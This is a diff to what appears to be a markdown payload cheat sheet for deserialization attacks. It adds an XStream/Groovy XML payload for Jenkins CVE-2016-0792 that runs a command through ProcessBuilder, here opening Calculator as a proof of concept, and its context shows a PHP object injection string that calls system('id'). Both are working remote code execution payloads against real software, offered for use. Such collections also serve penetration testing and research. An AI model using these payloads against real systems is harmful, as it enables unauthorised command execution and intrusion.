@@ -51,3 +51,36 @@ without restrictions
 
 `O:18:%22PHPObjectInjection%22:1:{s:6:%22inject%22;s:13:%22system(%27id%27);%22;}`
 
+
+
+## Jenkins CVE-2016-0792
+
+```
+<map>
+  <entry>
+    <groovy.util.Expando>
+      <expandoProperties>
+        <entry>
+          <string>hashCode</string>
+          <org.codehaus.groovy.runtime.MethodClosure>
+            <delegate class="groovy.util.Expando" reference="../../../.."/>
+            <owner class="java.lang.ProcessBuilder">
+              <command>
+                <string>open</string>
+                <string>/Applications/Calculator.app</string>
+              </command>
+              <redirectErrorStream>false</redirectErrorStream>
+            </owner>
+            <resolveStrategy>0</resolveStrategy>
+            <directive>0</directive>
+            <parameterTypes/>
+            <maximumNumberOfParameters>0</maximumNumberOfParameters>
+            <method>start</method>
+          </org.codehaus.groovy.runtime.MethodClosure>
+        </entry>
+      </expandoProperties>
+    </groovy.util.Expando>
+    <int>1</int>
+  </entry>
+</map>
+```
